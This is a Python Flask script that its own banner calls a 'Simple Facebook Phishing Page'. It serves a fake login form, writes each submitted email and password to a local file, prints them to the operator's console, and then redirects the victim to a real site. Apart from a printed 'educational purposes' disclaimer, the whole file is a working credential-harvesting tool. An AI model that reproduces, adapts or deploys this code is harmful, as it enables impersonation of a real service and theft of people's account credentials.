# Importing Modules.
import os, random, json, time # Core Modules
try:
    from waitress import serve
    from flask import Flask, render_template, send_file, request, redirect, url_for, Response
    from colorama import Fore, Style
except:
    print("""Missing Modules, run "pip3 install -r requirements.txt"\nIf pip doesn't exist then install it through your package manager [python3-pip].""")
    exit(0)

DEBUG = False # If set to true, the port will be set to 8080. Otherwise to 80.

## Reading Config File

f = open('config.json') # Opening Config File
config = json.load(f) # Loading Json Data
urlrd = config['redirect_url'] # Redirect URL 
langpack = 'langpkg/' + config['lang'] + '.json' # Language 
f.close() # Closing Config File

if os.path.isfile(langpack) == False: # Check if language pack exists.
    print("Missing Lang Pack, Not Found.")
    exit(0) # If not, exit.

appFlask = Flask(__name__) # Flask Stuff..

# Main Page

@appFlask.route('/')
def main():
    f = open(langpack)
    lang = json.load(f) # Loading Json Data
    title = lang['title']
    motd = lang['motd']
    email = lang['email']
    password = lang['password']
    login = lang['login']
    forgot = lang['forgot']
    new_account = lang['new-account']
    new_page = lang['new-page']
    new_page_bold = new_page.split("%end_bold%")[0]
    new_page = new_page.split("%end_bold%")[1]
    return render_template("index.html", title=title, motd=motd, email=email, password=password, login=login, forgot=forgot, new_account=new_account, new_page_bold=new_page_bold, new_page=new_page) # Render the HTML document.

## Random String Generator

def randstring(length=26):
    valid_letters='ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join((random.choice(valid_letters) for i in range(length)))

rtoken = randstring(26) # Generating a string 

@appFlask.route('/login', methods = ['POST']) # The URL Where we'll post form data to.
def login():
    data = request.form.to_dict(flat=False) # Converting to python dict.
    with open("pass.txt", "a") as file: # Opening a text file to save form data to.
        email = str(data["email"])
        password = str(data["password"])
        file.write("Email: " + email + "Password: " + password + "\n")
        file.close()
        print(Fore.GREEN + f"[+] Someone Logged In: Email: {email} | Password: {password}" + Fore.RESET)
    return redirect(f"/redirect/{str(rtoken)}") # Redirect to the Redirect Func.

@appFlask.route('/redirect/<token>')
def redirecturl(token):
    if str(token) != str(rtoken):
        return redirect(url_for('main'))
    redirecthtml = f"""
    <!DOCTYPE html><html><head><meta http-equiv="Refresh" content="0; url='{urlrd}'"/></head></html>
    """
    return redirecthtml # Redirect the page using vanilla HTML5.

@appFlask.route('/content/<media>') # Send back Images & CSS Files.
def load(media):
    try:
        return send_file(f"content/{media}")
    except Exception:
        return f"{media} does not exist."
    
@appFlask.errorhandler(404) # Handle 404 Errors
def not_found(e):
    return redirect(url_for('main')) # Redirect to /

@appFlask.errorhandler(500) # Handle 500 Errors
def internal_server_error(e):
    return redirect(url_for('main')) # Redirect to /

if __name__ == "__main__":
    print(Fore.CYAN + "[*] Simple Facebook Phishing Page Made By Wh1ter0seo4 on github.")
    print("[-] Project's Github Page: https://github.com/Wh1ter0sEo4/SimpleFacebookPhishingPage" + Fore.RESET)
    print(Fore.RED + "\nDO NOT USE THIS TOOL TO FARM ACTUAL ACCOUNT CREDENTIALS, IT'S MADE STRICTLY FOR EDUCATIONAL & EXPERIMENTAL REASONS. I, THE CREATOR OF THIS TOOL, AM NOT RESPONSABLE FOR ANY DAMAGE YOU MAY CAUSE.\n" + Fore.RESET)
    time.sleep(1)
    print("[+] Starting Web Server")
    if DEBUG:
        port = 8080
        print(Fore.YELLOW + f"[!] DEBUG Mode Enabled, Running on port {port}!" + Fore.RESET)
    else:
        port = 80
    serve(appFlask, host='0.0.0.0', port=port, threads=1)
